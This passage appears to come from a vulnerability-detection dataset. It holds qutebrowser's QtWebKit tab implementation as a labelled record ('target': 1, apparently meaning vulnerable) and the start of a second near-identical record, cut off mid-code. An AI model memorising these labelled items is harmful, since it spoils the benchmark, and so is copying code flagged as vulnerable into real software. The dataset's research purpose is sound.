QWebPage.FindFlags(0)  # type: ignore\n        if self._is_case_sensitive(ignore_case):\n            self._flags |= QWebPage.FindCaseSensitively\n        if reverse:\n            self._flags |= QWebPage.FindBackward\n        if wrap:\n            self._flags |= QWebPage.FindWrapsAroundDocument\n        # We actually search *twice* - once to highlight everything, then again\n        # to get a mark so we can navigate.\n        found = self._widget.findText(text, self._flags)\n        self._widget.findText(text,\n                              self._flags | QWebPage.HighlightAllOccurrences)\n        self._call_cb(result_cb, found, text, self._flags, 'search')\n\n    def next_result(self, *, result_cb=None):\n        self.search_displayed = True\n        found = self._widget.findText(self.text, self._flags)\n        self._call_cb(result_cb, found, self.text, self._flags, 'next_result')\n\n    def prev_result(self, *, result_cb=None):\n        self.search_displayed = True\n        # The int() here makes sure we get a copy of the flags.\n        flags = QWebPage.FindFlags(int(self._flags))  # type: ignore\n        if flags & QWebPage.FindBackward:\n            flags &= ~QWebPage.FindBackward\n        else:\n            flags |= QWebPage.FindBackward\n        found = self._widget.findText(self.text, flags)\n        self._call_cb(result_cb, found, self.text, flags, 'prev_result')\n\n\nclass WebKitCaret(browsertab.AbstractCaret):\n\n    \"\"\"QtWebKit implementations related to moving the cursor/selection.\"\"\"\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_entered(self, mode):\n        if mode != usertypes.KeyMode.caret:\n            return\n\n        self.selection_enabled = self._widget.hasSelection()\n        self.selection_toggled.emit(self.selection_enabled)\n        settings = self._widget.settings()\n        settings.setAttribute(QWebSettings.CaretBrowsingEnabled, True)\n\n        if self._widget.isVisible():\n            # Sometimes the caret isn't immediately visible, but unfocusing\n            # and refocusing it fixes that.\n            self._widget.clearFocus()\n            self._widget.setFocus(Qt.OtherFocusReason)\n\n            # Move the caret to the first element in the viewport if there\n            # isn't any text which is already selected.\n            #\n            # Note: We can't use hasSelection() here, as that's always\n            # true in caret mode.\n            if not self.selection_enabled:\n                self._widget.page().currentFrame().evaluateJavaScript(\n                    utils.read_file('javascript/position_caret.js'))\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_left(self, _mode):\n        settings = self._widget.settings()\n        if settings.testAttribute(QWebSettings.CaretBrowsingEnabled):\n            if self.selection_enabled and self._widget.hasSelection():\n                # Remove selection if it exists\n                self._widget.triggerPageAction(QWebPage.MoveToNextChar)\n            settings.setAttribute(QWebSettings.CaretBrowsingEnabled, False)\n            self.selection_enabled = False\n\n    def move_to_next_line(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToNextLine\n        else:\n            act = QWebPage.SelectNextLine\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_prev_line(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousLine\n        else:\n            act = QWebPage.SelectPreviousLine\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_next_char(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToNextChar\n        else:\n            act = QWebPage.SelectNextChar\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_prev_char(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousChar\n        else:\n            act = QWebPage.SelectPreviousChar\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_end_of_word(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextWord]\n            if utils.is_windows:  # pragma: no cover\n                act.append(QWebPage.MoveToPreviousChar)\n        else:\n            act = [QWebPage.SelectNextWord]\n            if utils.is_windows:  # pragma: no cover\n                act.append(QWebPage.SelectPreviousChar)\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_next_word(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextWord]\n            if not utils.is_windows:  # pragma: no branch\n                act.append(QWebPage.MoveToNextChar)\n        else:\n            act = [QWebPage.SelectNextWord]\n            if not utils.is_windows:  # pragma: no branch\n                act.append(QWebPage.SelectNextChar)\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_prev_word(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousWord\n        else:\n            act = QWebPage.SelectPreviousWord\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_start_of_line(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToStartOfLine\n        else:\n            act = QWebPage.SelectStartOfLine\n        self._widget.triggerPageAction(act)\n\n    def move_to_end_of_line(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToEndOfLine\n        else:\n            act = QWebPage.SelectEndOfLine\n        self._widget.triggerPageAction(act)\n\n    def move_to_start_of_next_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextLine,\n                   QWebPage.MoveToStartOfBlock]\n        else:\n            act = [QWebPage.SelectNextLine,\n                   QWebPage.SelectStartOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_start_of_prev_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToPreviousLine,\n                   QWebPage.MoveToStartOfBlock]\n        else:\n            act = [QWebPage.SelectPreviousLine,\n                   QWebPage.SelectStartOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_end_of_next_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextLine,\n                   QWebPage.MoveToEndOfBlock]\n        else:\n            act = [QWebPage.SelectNextLine,\n                   QWebPage.SelectEndOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_end_of_prev_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToPreviousLine, QWebPage.MoveToEndOfBlock]\n        else:\n            act = [QWebPage.SelectPreviousLine, QWebPage.SelectEndOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_start_of_document(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToStartOfDocument\n        else:\n            act = QWebPage.SelectStartOfDocument\n        self._widget.triggerPageAction(act)\n\n    def move_to_end_of_document(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToEndOfDocument\n        else:\n            act = QWebPage.SelectEndOfDocument\n        self._widget.triggerPageAction(act)\n\n    def toggle_selection(self):\n        self.selection_enabled = not self.selection_enabled\n        self.selection_toggled.emit(self.selection_enabled)\n\n    def drop_selection(self):\n        self._widget.triggerPageAction(QWebPage.MoveToNextChar)\n\n    def selection(self, callback):\n        callback(self._widget.selectedText())\n\n    def reverse_selection(self):\n        self._tab.run_js_async(\"\"\"{\n            const sel = window.getSelection();\n            sel.setBaseAndExtent(\n                sel.extentNode, sel.extentOffset, sel.baseNode,\n                sel.baseOffset\n            );\n        }\"\"\")\n\n    def _follow_selected(self, *, tab=False):\n        if QWebSettings.globalSettings().testAttribute(\n                QWebSettings.JavascriptEnabled):\n            if tab:\n                self._tab.data.override_target = usertypes.ClickTarget.tab\n            self._tab.run_js_async(\"\"\"\n                const aElm = document.activeElement;\n                if (window.getSelection().anchorNode) {\n                    window.getSelection().anchorNode.parentNode.click();\n                } else if (aElm && aElm !== document.body) {\n                    aElm.click();\n                }\n            \"\"\")\n        else:\n            selection = self._widget.selectedHtml()\n            if not selection:\n                # Getting here may mean we crashed, but we can't do anything\n                # about that until this commit is released:\n                # https://github.com/annulen/webkit/commit/0e75f3272d149bc64899c161f150eb341a2417af\n                # TODO find a way to check if something is focused\n                self._follow_enter(tab)\n                return\n            try:\n                selected_element = xml.etree.ElementTree.fromstring(\n                    '<html>{}</html>'.format(selection)).find('a')\n            except xml.etree.ElementTree.ParseError:\n                raise browsertab.WebTabError('Could not parse selected '\n                                             'element!')\n\n            if selected_element is not None:\n                try:\n                    url = selected_element.attrib['href']\n                except KeyError:\n                    raise browsertab.WebTabError('Anchor element without '\n                                                 'href!')\n                url = self._tab.url().resolved(QUrl(url))\n                if tab:\n                    self._tab.new_tab_requested.emit(url)\n                else:\n                    self._tab.load_url(url)\n\n    def follow_selected(self, *, tab=False):\n        try:\n            self._follow_selected(tab=tab)\n        finally:\n            self.follow_selected_done.emit()\n\n\nclass WebKitZoom(browsertab.AbstractZoom):\n\n    \"\"\"QtWebKit implementations related to zooming.\"\"\"\n\n    def _set_factor_internal(self, factor):\n        self._widget.setZoomFactor(factor)\n\n\nclass WebKitScroller(browsertab.AbstractScroller):\n\n    \"\"\"QtWebKit implementations related to scrolling.\"\"\"\n\n    # FIXME:qtwebengine When to use the main frame, when the current one?\n\n    def pos_px(self):\n        return self._widget.page().mainFrame().scrollPosition()\n\n    def pos_perc(self):\n        return self._widget.scroll_pos\n\n    def to_point(self, point):\n        self._widget.page().mainFrame().setScrollPosition(point)\n\n    def to_anchor(self, name):\n        self._widget.page().mainFrame().scrollToAnchor(name)\n\n    def delta(self, x: int = 0, y: int = 0) -> None:\n        qtutils.check_overflow(x, 'int')\n        qtutils.check_overflow(y, 'int')\n        self._widget.page().mainFrame().scroll(x, y)\n\n    def delta_page(self, x: float = 0.0, y: float = 0.0) -> None:\n        if y.is_integer():\n            y = int(y)\n            if y == 0:\n                pass\n            elif y < 0:\n                self.page_up(count=-y)\n            elif y > 0:\n                self.page_down(count=y)\n            y = 0\n        if x == 0 and y == 0:\n            return\n        size = self._widget.page().mainFrame().geometry()\n        self.delta(int(x * size.width()), int(y * size.height()))\n\n    def to_perc(self, x=None, y=None):\n        if x is None and y == 0:\n            self.top()\n        elif x is None and y == 100:\n            self.bottom()\n        else:\n            for val, orientation in [(x, Qt.Horizontal), (y, Qt.Vertical)]:\n                if val is not None:\n                    frame = self._widget.page().mainFrame()\n                    maximum = frame.scrollBarMaximum(orientation)\n                    if maximum == 0:\n                        continue\n                    pos = int(maximum * val / 100)\n                    pos = qtutils.check_overflow(pos, 'int', fatal=False)\n                    frame.setScrollBarValue(orientation, pos)\n\n    def _key_press(self, key, count=1, getter_name=None, direction=None):\n        frame = self._widget.page().mainFrame()\n        getter = None if getter_name is None else getattr(frame, getter_name)\n\n        # FIXME:qtwebengine needed?\n        # self._widget.setFocus()\n\n        for _ in range(min(count, 5000)):\n            # Abort scrolling if the minimum/maximum was reached.\n            if (getter is not None and\n                    frame.scrollBarValue(direction) == getter(direction)):\n                return\n            self._tab.fake_key_press(key)\n\n    def up(self, count=1):\n        self._key_press(Qt.Key_Up, count, 'scrollBarMinimum', Qt.Vertical)\n\n    def down(self, count=1):\n        self._key_press(Qt.Key_Down, count, 'scrollBarMaximum', Qt.Vertical)\n\n    def left(self, count=1):\n        self._key_press(Qt.Key_Left, count, 'scrollBarMinimum', Qt.Horizontal)\n\n    def right(self, count=1):\n        self._key_press(Qt.Key_Right, count, 'scrollBarMaximum', Qt.Horizontal)\n\n    def top(self):\n        self._key_press(Qt.Key_Home)\n\n    def bottom(self):\n        self._key_press(Qt.Key_End)\n\n    def page_up(self, count=1):\n        self._key_press(Qt.Key_PageUp, count, 'scrollBarMinimum', Qt.Vertical)\n\n    def page_down(self, count=1):\n        self._key_press(Qt.Key_PageDown, count, 'scrollBarMaximum',\n                        Qt.Vertical)\n\n    def at_top(self):\n        return self.pos_px().y() == 0\n\n    def at_bottom(self):\n        frame = self._widget.page().currentFrame()\n        return self.pos_px().y() >= frame.scrollBarMaximum(Qt.Vertical)\n\n\nclass WebKitHistoryPrivate(browsertab.AbstractHistoryPrivate):\n\n    \"\"\"History-related methods which are not part of the extension API.\"\"\"\n\n    def serialize(self):\n        return qtutils.serialize(self._history)\n\n    def deserialize(self, data):\n        qtutils.deserialize(data, self._history)\n\n    def load_items(self, items):\n        if items:\n            self._tab.before_load_started.emit(items[-1].url)\n\n        stream, _data, user_data = tabhistory.serialize(items)\n        qtutils.deserialize_stream(stream, self._history)\n        for i, data in enumerate(user_data):\n            self._history.itemAt(i).setUserData(data)\n        cur_data = self._history.currentItem().userData()\n        if cur_data is not None:\n            if 'zoom' in cur_data:\n                self._tab.zoom.set_factor(cur_data['zoom'])\n            if ('scroll-pos' in cur_data and\n                    self._tab.scroller.pos_px() == QPoint(0, 0)):\n                QTimer.singleShot(0, functools.partial(\n                    self._tab.scroller.to_point, cur_data['scroll-pos']))\n\n\nclass WebKitHistory(browsertab.AbstractHistory):\n\n    \"\"\"QtWebKit implementations related to page history.\"\"\"\n\n    def __init__(self, tab):\n        super().__init__(tab)\n        self.private_api = WebKitHistoryPrivate(tab)\n\n    def __len__(self):\n        return len(self._history)\n\n    def __iter__(self):\n        return iter(self._history.items())\n\n    def current_idx(self):\n        return self._history.currentItemIndex()\n\n    def can_go_back(self):\n        return self._history.canGoBack()\n\n    def can_go_forward(self):\n        return self._history.canGoForward()\n\n    def _item_at(self, i):\n        return self._history.itemAt(i)\n\n    def _go_to_item(self, item):\n        self._tab.before_load_started.emit(item.url())\n        self._history.goToItem(item)\n\n\nclass WebKitElements(browsertab.AbstractElements):\n\n    \"\"\"QtWebKit implemementations related to elements on the page.\"\"\"\n\n    def find_css(self, selector, callback, error_cb, *, only_visible=False):\n        utils.unused(error_cb)\n        mainframe = self._widget.page().mainFrame()\n        if mainframe is None:\n            raise browsertab.WebTabError(\"No frame focused!\")\n\n        elems = []\n        frames = webkitelem.get_child_frames(mainframe)\n        for f in frames:\n            for elem in f.findAllElements(selector):\n                elems.append(webkitelem.WebKitElement(elem, tab=self._tab))\n\n        if only_visible:\n            # pylint: disable=protected-access\n            elems = [e for e in elems if e._is_visible(mainframe)]\n            # pylint: enable=protected-access\n\n        callback(elems)\n\n    def find_id(self, elem_id, callback):\n        def find_id_cb(elems):\n            \"\"\"Call the real callback with the found elements.\"\"\"\n            if not elems:\n                callback(None)\n            else:\n                callback(elems[0])\n\n        # Escape non-alphanumeric characters in the selector\n        # https://www.w3.org/TR/CSS2/syndata.html#value-def-identifier\n        elem_id = re.sub(r'[^a-zA-Z0-9_-]', r'\\\\\\g<0>', elem_id)\n        self.find_css('#' + elem_id, find_id_cb, error_cb=lambda exc: None)\n\n    def find_focused(self, callback):\n        frame = self._widget.page().currentFrame()\n        if frame is None:\n            callback(None)\n            return\n\n        elem = frame.findFirstElement('*:focus')\n        if elem.isNull():\n            callback(None)\n        else:\n            callback(webkitelem.WebKitElement(elem, tab=self._tab))\n\n    def find_at_pos(self, pos, callback):\n        assert pos.x() >= 0\n        assert pos.y() >= 0\n        frame = self._widget.page().frameAt(pos)\n        if frame is None:\n            # This happens when we click inside the webview, but not actually\n            # on the QWebPage - for example when clicking the scrollbar\n            # sometimes.\n            log.webview.debug(\"Hit test at {} but frame is None!\".format(pos))\n            callback(None)\n            return\n\n        # You'd think we have to subtract frame.geometry().topLeft() from the\n        # position, but it seems QWebFrame::hitTestContent wants a position\n        # relative to the QWebView, not to the frame. This makes no sense to\n        # me, but it works this way.\n        hitresult = frame.hitTestContent(pos)\n        if hitresult.isNull():\n            # For some reason, the whole hit result can be null sometimes (e.g.\n            # on doodle menu links).\n            log.webview.debug(\"Hit test result is null!\")\n            callback(None)\n            return\n\n        try:\n            elem = webkitelem.WebKitElement(hitresult.element(), tab=self._tab)\n        except webkitelem.IsNullError:\n            # For some reason, the hit result element can be a null element\n            # sometimes (e.g. when clicking the timetable fields on\n            # http://www.sbb.ch/ ).\n            log.webview.debug(\"Hit test result element is null!\")\n            callback(None)\n            return\n\n        callback(elem)\n\n\nclass WebKitAudio(browsertab.AbstractAudio):\n\n    \"\"\"Dummy handling of audio status for QtWebKit.\"\"\"\n\n    def set_muted(self, muted: bool, override: bool = False) -> None:\n        raise browsertab.WebTabError('Muting is not supported on QtWebKit!')\n\n    def is_muted(self):\n        return False\n\n    def is_recently_audible(self):\n        return False\n\n\nclass WebKitTabPrivate(browsertab.AbstractTabPrivate):\n\n    \"\"\"QtWebKit-related methods which aren't part of the public API.\"\"\"\n\n    def networkaccessmanager(self):\n        return self._widget.page().networkAccessManager()\n\n    def clear_ssl_errors(self):\n        self.networkaccessmanager().clear_all_ssl_errors()\n\n    def event_target(self):\n        return self._widget\n\n    def shutdown(self):\n        self._widget.shutdown()\n\n\nclass WebKitTab(browsertab.AbstractTab):\n\n    \"\"\"A QtWebKit tab in the browser.\"\"\"\n\n    def __init__(self, *, win_id, mode_manager, private, parent=None):\n        super().__init__(win_id=win_id, private=private, parent=parent)\n        widget = webview.WebView(win_id=win_id, tab_id=self.tab_id,\n                                 private=private, tab=self)\n        if private:\n            self._make_private(widget)\n        self.history = WebKitHistory(tab=self)\n        self.scroller = WebKitScroller(tab=self, parent=self)\n        self.caret = WebKitCaret(mode_manager=mode_manager,\n                                 tab=self, parent=self)\n        self.zoom = WebKitZoom(tab=self, parent=self)\n        self.search = WebKitSearch(tab=self, parent=self)\n        self.printing = WebKitPrinting(tab=self)\n        self.elements = WebKitElements(tab=self)\n        self.action = WebKitAction(tab=self)\n        self.audio = WebKitAudio(tab=self, parent=self)\n        self.private_api = WebKitTabPrivate(mode_manager=mode_manager,\n                                            tab=self)\n        # We're assigning settings in _set_widget\n        self.settings = webkitsettings.WebKitSettings(settings=None)\n        self._set_widget(widget)\n        self._connect_signals()\n        self.backend = usertypes.Backend.QtWebKit\n\n    def _install_event_filter(self):\n        self._widget.installEventFilter(self._tab_event_filter)\n\n    def _make_private(self, widget):\n        settings = widget.settings()\n        settings.setAttribute(QWebSettings.PrivateBrowsingEnabled, True)\n\n    def load_url(self, url, *, emit_before_load_started=True):\n        self._load_url_prepare(\n            url, emit_before_load_started=emit_before_load_started)\n        self._widget.load(url)\n\n    def url(self, *, requested=False):\n        frame = self._widget.page().mainFrame()\n        if requested:\n            return frame.requestedUrl()\n        else:\n            return frame.url()\n\n    def dump_async(self, callback, *, plain=False):\n        frame = self._widget.page().mainFrame()\n        if plain:\n            callback(frame.toPlainText())\n        else:\n            callback(frame.toHtml())\n\n    def run_js_async(self, code, callback=None, *, world=None):\n        if world is not None and world != usertypes.JsWorld.jseval:\n            log.webview.warning(\"Ignoring world ID {}\".format(world))\n        document_element = self._widget.page().mainFrame().documentElement()\n        result = document_element.evaluateJavaScript(code)\n        if callback is not None:\n            callback(result)\n\n    def icon(self):\n        return self._widget.icon()\n\n    def reload(self, *, force=False):\n        if force:\n            action = QWebPage.ReloadAndBypassCache\n        else:\n            action = QWebPage.Reload\n        self._widget.triggerPageAction(action)\n\n    def stop(self):\n        self._widget.stop()\n\n    def title(self):\n        return self._widget.title()\n\n    @pyqtSlot()\n    def _on_history_trigger(self):\n        url = self.url()\n        requested_url = self.url(requested=True)\n        self.history_item_triggered.emit(url, requested_url, self.title())\n\n    def set_html(self, html, base_url=QUrl()):\n        self._widget.setHtml(html, base_url)\n\n    @pyqtSlot()\n    def _on_load_started(self):\n        super()._on_load_started()\n        nam = self._widget.page().networkAccessManager()\n        nam.netrc_used = False\n        # Make sure the icon is cleared when navigating to a page without one.\n        self.icon_changed.emit(QIcon())\n\n    @pyqtSlot(bool)\n    def _on_load_finished(self, ok: bool) -> None:\n        super()._on_load_finished(ok)\n        self._update_load_status(ok)\n\n    @pyqtSlot()\n    def _on_frame_load_finished(self):\n        \"\"\"Make sure we emit an appropriate status when loading finished.\n\n        While Qt has a bool \"ok\" attribute for loadFinished, it always is True\n        when using error pages... See\n        https://github.com/qutebrowser/qutebrowser/issues/84\n        \"\"\"\n        self._on_load_finished(not self._widget.page().error_occurred)\n\n    @pyqtSlot()\n    def _on_webkit_icon_changed(self):\n        \"\"\"Emit iconChanged with a QIcon like QWebEngineView does.\"\"\"\n        if sip.isdeleted(self._widget):\n            log.webview.debug(\"Got _on_webkit_icon_changed for deleted view!\")\n            return\n        self.icon_changed.emit(self._widget.icon())\n\n    @pyqtSlot(QWebFrame)\n    def _on_frame_created(self, frame):\n        \"\"\"Connect the contentsSizeChanged signal of each frame.\"\"\"\n        # FIXME:qtwebengine those could theoretically regress:\n        # https://github.com/qutebrowser/qutebrowser/issues/152\n        # https://github.com/qutebrowser/qutebrowser/issues/263\n        frame.contentsSizeChanged.connect(self._on_contents_size_changed)\n\n    @pyqtSlot(QSize)\n    def _on_contents_size_changed(self, size):\n        self.contents_size_changed.emit(QSizeF(size))\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(self, navigation):\n        super()._on_navigation_request(navigation)\n        if not navigation.accepted:\n            return\n\n        log.webview.debug(\"target {} override {}\".format(\n            self.data.open_target, self.data.override_target))\n\n        if self.data.override_target is not None:\n            target = self.data.override_target\n            self.data.override_target = None\n        else:\n            target = self.data.open_target\n\n        if (navigation.navigation_type == navigation.Type.link_clicked and\n                target != usertypes.ClickTarget.normal):\n            tab = shared.get_tab(self.win_id, target)\n            tab.load_url(navigation.url)\n            self.data.open_target = usertypes.ClickTarget.normal\n            navigation.accepted = False\n\n        if navigation.is_main_frame:\n            self.settings.update_for_url(navigation.url)\n\n    @pyqtSlot()\n    def _on_ssl_errors(self):\n        self._has_ssl_errors = True\n\n    def _connect_signals(self):\n        view = self._widget\n        page = view.page()\n        frame = page.mainFrame()\n        page.windowCloseRequested.connect(self.window_close_requested)\n        page.linkHovered.connect(self.link_hovered)\n        page.loadProgress.connect(self._on_load_progress)\n        frame.loadStarted.connect(self._on_load_started)\n        view.scroll_pos_changed.connect(self.scroller.perc_changed)\n        view.titleChanged.connect(self.title_changed)\n        view.urlChanged.connect(self._on_url_changed)\n        view.shutting_down.connect(self.shutting_down)\n        page.networkAccessManager().sslErrors.connect(self._on_ssl_errors)\n        frame.loadFinished.connect(self._on_frame_load_finished)\n        view.iconChanged.connect(self._on_webkit_icon_changed)\n        page.frameCreated.connect(self._on_frame_created)\n        frame.contentsSizeChanged.connect(self._on_contents_size_changed)\n        frame.initialLayoutCompleted.connect(self._on_history_trigger)\n        page.navigation_request.connect(self._on_navigation_request)\n", "target": 1}
{"idx": 1010, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2018 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Wrapper over our (QtWebKit) WebView.\"\"\"\n\nimport re\nimport functools\nimport xml.etree.ElementTree\n\nfrom PyQt5.QtCore import (pyqtSlot, Qt, QEvent, QUrl, QPoint, QTimer, QSizeF,\n                          QSize)\nfrom PyQt5.QtGui import QKeyEvent, QIcon\nfrom PyQt5.QtWebKitWidgets import QWebPage, QWebFrame\nfrom PyQt5.QtWebKit import QWebSettings\nfrom PyQt5.QtPrintSupport import QPrinter\n\nfrom qutebrowser.browser import browsertab, shared\nfrom qutebrowser.browser.webkit import (webview, tabhistory, webkitelem,\n                                        webkitsettings)\nfrom qutebrowser.utils import qtutils, usertypes, utils, log, debug\nfrom qutebrowser.qt import sip\n\n\nclass WebKitAction(browsertab.AbstractAction):\n\n    \"\"\"QtWebKit implementations related to web actions.\"\"\"\n\n    action_class = QWebPage\n    action_base = QWebPage.WebAction\n\n    def exit_fullscreen(self):\n        raise browsertab.UnsupportedOperationError\n\n    def save_page(self):\n        \"\"\"Save the current page.\"\"\"\n        raise browsertab.UnsupportedOperationError\n\n    def show_source(self, pygments=False):\n        self._show_source_pygments()\n\n\nclass WebKitPrinting(browsertab.AbstractPrinting):\n\n    \"\"\"QtWebKit implementations related to printing.\"\"\"\n\n    def check_pdf_support(self):\n        pass\n\n    def check_printer_support(self):\n        pass\n\n    def check_preview_support(self):\n        pass\n\n    def to_pdf(self, filename):\n        printer = QPrinter()\n        printer.setOutputFileName(filename)\n        self.to_printer(printer)\n\n    def to_printer(self, printer, callback=None):\n        self._widget.print(printer)\n        # Can't find out whether there was an error...\n        if callback is not None:\n            callback(True)\n\n\nclass WebKitSearch(browsertab.AbstractSearch):\n\n    \"\"\"QtWebKit implementations related to searching on the page.\"\"\"\n\n    def __init__(self, parent=None):\n        super().__init__(parent)\n        self._flags = QWebPage.FindFlags(0)\n\n    def _call_cb(self, callback, found, text, flags, caller):\n        \"\"\"Call the given callback if it's non-None.\n\n        Delays the call via a QTimer so the website is re-rendered in between.\n\n        Args:\n            callback: What to call\n            found: If the text was found\n            text: The text searched for\n            flags: The flags searched with\n            caller: Name of the caller.\n        \"\"\"\n        found_text = 'found' if found else \"didn't find\"\n        # Removing FindWrapsAroundDocument to get the same logging as with\n        # QtWebEngine\n        debug_flags = debug.qflags_key(\n            QWebPage, flags & ~QWebPage.FindWrapsAroundDocument,\n            klass=QWebPage.FindFlag)\n        if debug_flags != '0x0000':\n            flag_text = 'with flags {}'.format(debug_flags)\n        else:\n            flag_text = ''\n        log.webview.debug(' '.join([caller, found_text, text, flag_text])\n                          .strip())\n        if callback is not None:\n            QTimer.singleShot(0, functools.partial(callback, found))\n\n    def clear(self):\n        self.search_displayed = False\n        # We first clear the marked text, then the highlights\n        self._widget.findText('')\n        self._widget.findText('', QWebPage.HighlightAllOccurrences)\n\n    def search(self, text, *, ignore_case='never', reverse=False,\n               result_cb=None):\n        # Don't go to next entry on duplicate search\n        if self.text == text and self.search_displayed:\n            log.webview.debug(\"Ignoring duplicate search request\"\n                              \" for {}\".format(text))\n            return\n\n        # Clear old search results, this is done automatically on QtWebEngine.\n        self.clear()\n\n        self.text = text\n        self.search_displayed = True\n        self._flags = QWebPage.FindWrapsAroundDocument\n        if self._is_case_sensitive(ignore_case):\n            self._flags |= QWebPage.FindCaseSensitively\n        if reverse:\n            self._flags |= QWebPage.FindBackward\n        # We actually search *twice* - once to highlight everything, then again\n        # to get a mark so we can navigate.\n        found = self._widget.findText(text, self._flags)\n        self._widget.findText(text,\n                              self._flags | QWebPage.HighlightAllOccurrences)\n        self._call_cb(result_cb, found, text, self._flags, 'search')\n\n    def next_result(self, *, result_cb=None):\n        self.search_displayed = True\n        found = self._widget.findText(self.text, self._flags)\n        self._call_cb(result_cb, found, self.text, self._flags, 'next_result')\n\n    def prev_result(self, *, result_cb=None):\n        self.search_displayed = True\n        # The int() here makes sure we get a copy of the flags.\n        flags = QWebPage.FindFlags(int(self._flags))\n        if flags & QWebPage.FindBackward:\n            flags &= ~QWebPage.FindBackward\n        else:\n            flags |= QWebPage.FindBackward\n        found = self._widget.findText(self.text, flags)\n        self._call_cb(result_cb, found, self.text, flags, 'prev_result')\n\n\nclass WebKitCaret(browsertab.AbstractCaret):\n\n    \"\"\"QtWebKit implementations related to moving the cursor/selection.\"\"\"\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_entered(self, mode):\n        if mode != usertypes.KeyMode.caret:\n            return\n\n        self.selection_enabled = self._widget.hasSelection()\n        self.selection_toggled.emit(self.selection_enabled)\n        settings = self._widget.settings()\n        settings.setAttribute(QWebSettings.CaretBrowsingEnabled, True)\n\n        if self._widget.isVisible():\n            # Sometimes the caret isn't immediately visible, but unfocusing\n            # and refocusing it fixes that.\n            self._widget.clearFocus()\n            self._widget.setFocus(Qt.OtherFocusReason)\n\n            # Move the caret to the first element in the viewport if there\n            # isn't any text which is already selected.\n            #\n            # Note: We can't use hasSelection() here, as that's always\n            # true in caret mode.\n            if not self.selection_enabled:\n                self._widget.page().currentFrame().evaluateJavaScript(\n                    utils.read_file('javascript/position_caret.js'))\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_left(self, _mode):\n        settings = self._widget.settings()\n        if settings.testAttribute(QWebSettings.CaretBrowsingEnabled):\n            if self.selection_enabled and self._widget.hasSelection():\n                # Remove selection if it exists\n                self._widget.triggerPageAction(QWebPage.MoveToNextChar)\n            settings.setAttribute(QWebSettings.CaretBrowsingEnabled, False)\n            self.selection_enabled = False\n\n    def move_to_next_line(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToNextLine\n        else:\n            act = QWebPage.SelectNextLine\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_prev_line(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousLine\n        else:\n            act = QWebPage.SelectPreviousLine\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_next_char(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToNextChar\n        else:\n            act = QWebPage.SelectNextChar\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_prev_char(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousChar\n        else:\n            act = QWebPage.SelectPreviousChar\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_end_of_word(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextWord]\n            if utils.is_windows:  # pragma: no cover\n                act.append(QWebPage.MoveToPreviousChar)\n        else:\n            act = [QWebPage.SelectNextWord]\n            if utils.is_windows:  # pragma: no cover\n                act.append(QWebPage.SelectPreviousChar)\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_next_word(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextWord]\n            if not utils.is_windows:  # pragma: no branch\n                act.append(QWebPage.MoveToNextChar)\n        else:\n            act = [QWebPage.SelectNextWord]\n            if not utils.is_windows:  # pragma: no branch\n                act.append(QWebPage.SelectNextChar)\n        for _ in range(count):\n            for a in act:\n                